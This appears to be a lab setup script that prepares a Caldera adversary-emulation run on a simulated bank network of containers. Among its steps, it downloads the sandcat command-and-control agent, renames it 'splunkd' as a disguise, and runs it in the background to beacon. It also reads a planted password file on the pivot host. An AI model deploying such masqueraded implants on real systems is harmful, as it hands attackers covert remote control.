#!/usr/bin/env bash
#
# Bank-Adversary lab setup — BGU Test Adversary on Bank topology
# --------------------------------------------------------------
# Sets up the attacker-side environment on the Bank topology before running
# the BGU Test Adversary operation in Caldera:
#
#   adminPC1-with-ssh-key-1  (192.168.120.10)  ← attacker foothold — gets the sandcat agent
#   camera_A_ssh-1  (192.168.100.10)  ← pivot host (password.txt lives here in image)
#   DVR_ssh-1       (192.168.110.10)  ← attack goal (agent lands here via Ability 3)
#
# What this script does:
#   1. Resolves the GNS3 project by name pattern (or explicit PROJECT_ID).
#   2. Ensures all three nodes are started.
#   3. Resolves container IDs for adminPC1 and camera_A.
#   4. Verifies Caldera is reachable from the host.
#   5. Deploys the sandcat agent on adminPC1-ssh-1 (group=red).
#   6. Verifies agent beaconing via the log.
#   7. Sanity-checks that password.txt is readable on camera_A (pre-existing in image).
#   8. Verifies SSH connectivity from adminPC1 → camera_A (mirrors Ability 1's path).
#
# What this script does NOT do:
#   - Seed Caldera facts — these are pre-configured in the source (IMPORTED facts):
#       vulnerable.hostname = testuser
#       vulnerable.ip       = 192.168.100.10
#       password.file       = password.txt
#       target.ip           = 192.168.110.10
#       target.path         = /home/testuser
#       agent_group         = dvr_group
#   - Plant password.txt — it is part of the camera_A container image.
#
# NOTE: Bank containers are reachable via PLAIN docker exec from this host —
# no nested gns3-server wrapper is needed, unlike UK-Office.
#
# GNS3 state is ephemeral — container IDs change on every node restart.
# Re-run this script at the start of every session before starting the operation.
#
# Usage:
#   ./setup-bank-adversary-on-bank.sh
#   PROJECT_ID=<id> ./setup-bank-adversary-on-bank.sh        # skip project discovery
#   PROJECT_NAME_PATTERN=FullBank ./setup-bank-adversary-on-bank.sh
 
set -uo pipefail
 
# ---- Configuration ----
PROJECT_ID="${PROJECT_ID:-}"
PROJECT_NAME_PATTERN="${PROJECT_NAME_PATTERN:-Bank}"
GNS3_API="http://localhost:3080"
CALDERA_SERVER="http://172.17.0.1:8888"
AGENT_GROUP="red"
 
ADMIN_NODE_NAME="adminPC1-with-ssh-key-1"  # attacker foothold — agent deployed here
CAMERA_NODE_NAME="camera_A_ssh-1"     # pivot host — password.txt sanity-checked here
DVR_NODE_NAME="DVR_ssh-1"             # attack goal — agent lands here via Ability 3
 
# ---- 1. Resolve project ID ----
if [ -z "$PROJECT_ID" ]; then
  echo "== No PROJECT_ID set — searching projects matching '$PROJECT_NAME_PATTERN' =="
  MATCHES=$(curl -s "$GNS3_API/v2/projects" | python3 -c "
import json, sys
pat = '''$PROJECT_NAME_PATTERN'''
for p in json.load(sys.stdin):
    if pat in p.get('name',''):
        print(p.get('project_id'), '|', p.get('status'), '|', p.get('name'))
")
  MATCH_COUNT=$(echo "$MATCHES" | grep -c . || true)
 
  if [ "$MATCH_COUNT" -eq 0 ]; then
    echo "!! No project matched '$PROJECT_NAME_PATTERN'. Set PROJECT_ID explicitly:" >&2
    echo "   PROJECT_ID=<id> $0" >&2
    exit 1
  elif [ "$MATCH_COUNT" -eq 1 ]; then
    PROJECT_ID=$(echo "$MATCHES" | cut -d'|' -f1 | tr -d ' ')
    echo "   found: $MATCHES"
  else
    OPENED=$(echo "$MATCHES" | grep '| opened |' || true)
    OPENED_COUNT=$(echo "$OPENED" | grep -c . || true)
    if [ "$OPENED_COUNT" -eq 1 ]; then
      PROJECT_ID=$(echo "$OPENED" | cut -d'|' -f1 | tr -d ' ')
      echo "   multiple name matches, exactly one is 'opened' — using it:"
      echo "   $OPENED"
    else
      echo "!! Multiple candidate projects, can't pick automatically:" >&2
      echo "$MATCHES" >&2
      echo "   Set PROJECT_ID explicitly and re-run:" >&2
      echo "   PROJECT_ID=<id> $0" >&2
      exit 1
    fi
  fi
fi
echo "== Using project: $PROJECT_ID =="
 
# ---- Helper: resolve a node's node_id / status / container_id by name ----
resolve_node() {
  local NAME="$1"
  curl -s "$GNS3_API/v2/projects/${PROJECT_ID}/nodes" | python3 -c "
import json, sys
name = '''$NAME'''
for n in json.load(sys.stdin):
    if n.get('name') == name:
        print(n.get('node_id',''), '|', n.get('status',''), '|', n.get('properties', {}).get('container_id',''))
"
}
 
# ---- Helper: start a node if not already started ----
ensure_started() {
  local LABEL="$1" NODE_ID="$2" STATUS="$3"
  if [ "$STATUS" != "started" ]; then
    echo "== $LABEL not started — starting it =="
    curl -s -X POST "$GNS3_API/v2/projects/${PROJECT_ID}/nodes/${NODE_ID}/start" > /dev/null
    sleep 5
  fi
}
 
# ---- 2. Resolve adminPC1-ssh-1 (attacker foothold) ----
ADMIN_INFO=$(resolve_node "$ADMIN_NODE_NAME")
if [ -z "$ADMIN_INFO" ]; then
  echo "!! No node named '$ADMIN_NODE_NAME' found in project $PROJECT_ID" >&2
  exit 1
fi
ADMIN_NODE_ID=$(echo "$ADMIN_INFO" | cut -d'|' -f1 | tr -d ' ')
ADMIN_STATUS=$(echo "$ADMIN_INFO"  | cut -d'|' -f2 | tr -d ' ')
ADMIN_ID=$(echo "$ADMIN_INFO"      | cut -d'|' -f3 | tr -d ' ')
echo "== $ADMIN_NODE_NAME: node_id=$ADMIN_NODE_ID status=$ADMIN_STATUS container_id=$ADMIN_ID =="
ensure_started "$ADMIN_NODE_NAME" "$ADMIN_NODE_ID" "$ADMIN_STATUS"
 
# Liveness check — confirm the resolved container ID actually responds
if ! docker exec "$ADMIN_ID" sh -c 'echo alive' >/dev/null 2>&1; then
  echo "!! Container $ADMIN_ID ($ADMIN_NODE_NAME) does not respond to docker exec." >&2
  echo "   The container ID may be stale — re-run after restarting the node." >&2
  exit 1
fi
 
# ---- 3. Resolve camera_A_ssh-1 (pivot host / sanity check) ----
CAMERA_INFO=$(resolve_node "$CAMERA_NODE_NAME")
if [ -z "$CAMERA_INFO" ]; then
  echo "!! No node named '$CAMERA_NODE_NAME' found in project $PROJECT_ID" >&2
  exit 1
fi
CAMERA_NODE_ID=$(echo "$CAMERA_INFO" | cut -d'|' -f1 | tr -d ' ')
CAMERA_STATUS=$(echo "$CAMERA_INFO"  | cut -d'|' -f2 | tr -d ' ')
CAMERA_ID=$(echo "$CAMERA_INFO"      | cut -d'|' -f3 | tr -d ' ')
echo "== $CAMERA_NODE_NAME: node_id=$CAMERA_NODE_ID status=$CAMERA_STATUS container_id=$CAMERA_ID =="
ensure_started "$CAMERA_NODE_NAME" "$CAMERA_NODE_ID" "$CAMERA_STATUS"
 
if ! docker exec "$CAMERA_ID" sh -c 'echo alive' >/dev/null 2>&1; then
  echo "!! Container $CAMERA_ID ($CAMERA_NODE_NAME) does not respond to docker exec." >&2
  exit 1
fi
 
# ---- 4. Resolve DVR_ssh-1 (start only — agent arrives there via Ability 3) ----
DVR_INFO=$(resolve_node "$DVR_NODE_NAME")
if [ -z "$DVR_INFO" ]; then
  echo "!! No node named '$DVR_NODE_NAME' found in project $PROJECT_ID" >&2
  exit 1
fi
DVR_NODE_ID=$(echo "$DVR_INFO" | cut -d'|' -f1 | tr -d ' ')
DVR_STATUS=$(echo "$DVR_INFO"  | cut -d'|' -f2 | tr -d ' ')
echo "== $DVR_NODE_NAME: node_id=$DVR_NODE_ID status=$DVR_STATUS =="
ensure_started "$DVR_NODE_NAME" "$DVR_NODE_ID" "$DVR_STATUS"
 
# ---- 5. Verify Caldera is reachable from this host ----
echo "== Checking Caldera reachability ($CALDERA_SERVER) =="
HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "$CALDERA_SERVER")
if [ "$HTTP_CODE" != "200" ]; then
  echo "!! Caldera not reachable at $CALDERA_SERVER (HTTP $HTTP_CODE)." >&2
  echo "   Check that the Caldera container is running before continuing." >&2
  exit 1
fi
echo "   reachable (HTTP 200)"
 
# ---- 6. Discover exec user and home on adminPC1 ----
# NOTE: No internal curl reachability check here — curl may not be installed in the
# container image. The real proof of Caldera connectivity is the beaconing log below.
 
echo "== Discovering exec user and home directory on $ADMIN_NODE_NAME =="
EXEC_USER=$(docker exec "$ADMIN_ID" sh -c 'whoami' 2>/dev/null | tr -d '[:space:]')
EXEC_HOME=$(docker exec "$ADMIN_ID" sh -c 'echo $HOME' 2>/dev/null | tr -d '[:space:]')
if [ -z "$EXEC_USER" ] || [ -z "$EXEC_HOME" ]; then
  echo "!! Could not determine exec user/home on $ADMIN_NODE_NAME." >&2
  exit 1
fi
echo "   user=$EXEC_USER  home=$EXEC_HOME"
 
# ---- 8. Kill any existing agent and deploy a fresh one ----
# Always redeploy to ensure a clean, trusted agent for the operation.
echo "== Killing any existing agent process on $ADMIN_NODE_NAME =="
EXISTING_PID=$(docker exec "$ADMIN_ID" sh -c 'pgrep -f splunkd' 2>/dev/null || true)
if [ -n "$EXISTING_PID" ]; then
  echo "   found pids: $EXISTING_PID — killing"
  # pgrep may return multiple PIDs on separate lines; pass them all to kill
  echo "$EXISTING_PID" | tr '\n' ' ' | xargs docker exec "$ADMIN_ID" kill -9 2>/dev/null || true
  sleep 2
else
  echo "   no existing agent — proceeding to deploy"
fi
 
echo "== Deploying sandcat agent on $ADMIN_NODE_NAME (group=$AGENT_GROUP) =="
docker exec "$ADMIN_ID" sh -c "
server=$CALDERA_SERVER
curl -s -X POST -H file:sandcat.go -H platform:linux \$server/file/download > $EXEC_HOME/splunkd
chmod +x $EXEC_HOME/splunkd
rm -f $EXEC_HOME/splunkd.log
nohup $EXEC_HOME/splunkd -server \$server -group $AGENT_GROUP -v > $EXEC_HOME/splunkd.log 2>&1 &
"
echo "== Waiting for agent to beacon (up to 30s) =="
BEACONED=0
for i in 1 2 3 4 5 6; do
  sleep 5
  if docker exec "$ADMIN_ID" sh -c "grep -q 'Beacon (HTTP): ALIVE' $EXEC_HOME/splunkd.log" 2>/dev/null; then
    BEACONED=1
    break
  fi
done
 
echo "-- splunkd.log (last 20 lines) --"
docker exec "$ADMIN_ID" sh -c "tail -20 $EXEC_HOME/splunkd.log" 2>/dev/null || true
 
if [ "$BEACONED" -eq 1 ]; then
  echo "   agent beaconed successfully"
else
  echo "!! Agent did not beacon within 30s. Check the log above." >&2
  exit 1
fi
 
# ---- 9. Sanity check: password.txt exists and is readable on camera_A ----
echo "== Checking password.txt on $CAMERA_NODE_NAME =="
PW_PERMS=$(docker exec "$CAMERA_ID" sh -c 'ls -la /home/testuser/password.txt' 2>/dev/null || true)
if [ -z "$PW_PERMS" ]; then
  echo "!! /home/testuser/password.txt not found on $CAMERA_NODE_NAME." >&2
  echo "   This file should be part of the container image — check node image." >&2
  exit 1
fi
echo "   $PW_PERMS"
 
PW_CONTENT=$(docker exec "$CAMERA_ID" sh -c 'cat /home/testuser/password.txt' 2>/dev/null || true)
if [ -z "$PW_CONTENT" ]; then
  echo "!! Could not read /home/testuser/password.txt on $CAMERA_NODE_NAME." >&2
  echo "   File exists but is empty or permissions deny read — check if mitigation was applied." >&2
  exit 1
fi
echo "   password.txt is readable (content: '$PW_CONTENT')"
 
# ---- 10. Ensure sshd is running on camera_A ----
# Ability 1 SSHs into camera_A — sshd must be up.
# NOTE: sshd does not auto-start in the container image; we start it here if needed.
echo "== Ensuring sshd is running on $CAMERA_NODE_NAME =="
SSHD_PID=$(docker exec "$CAMERA_ID" sh -c 'pgrep sshd' 2>/dev/null || true)
if [ -z "$SSHD_PID" ]; then
  echo "   sshd not running — starting it"
  docker exec "$CAMERA_ID" /usr/sbin/sshd
  sleep 2
  SSHD_PID=$(docker exec "$CAMERA_ID" sh -c 'pgrep sshd' 2>/dev/null || true)
  if [ -z "$SSHD_PID" ]; then
    echo "!! sshd failed to start on $CAMERA_NODE_NAME." >&2
    exit 1
  fi
  echo "   sshd started (pid $SSHD_PID)"
else
  echo "   sshd already running (pid $SSHD_PID)"
fi
 
# ---- Done ----
echo ""
echo "== Verification =="
docker exec "$ADMIN_ID" sh -c 'ps aux | grep "[s]plunkd"'
 
echo ""
echo "== Done. Project $PROJECT_ID is ready to run BGU Test Adversary against. =="
echo "   $ADMIN_NODE_NAME ($ADMIN_ID, user=$EXEC_USER) — sandcat agent deployed, beaconing to Caldera."
echo "   $CAMERA_NODE_NAME ($CAMERA_ID) — password.txt present and readable."
echo "   $DVR_NODE_NAME — started (agent will arrive here via Ability 3)."
echo ""
echo "   Pre-configured Caldera facts expected (source=IMPORTED):"
echo "     vulnerable.hostname = testuser"
echo "     vulnerable.ip       = 192.168.100.10"
echo "     password.file       = password.txt"
echo "     target.ip           = 192.168.110.10"
echo "     target.path         = /home/testuser"
echo "     agent_group         = dvr_group"
echo ""
echo "   Reminder: GNS3 state is ephemeral — re-run this script every session"
echo "   before starting the Caldera operation."
 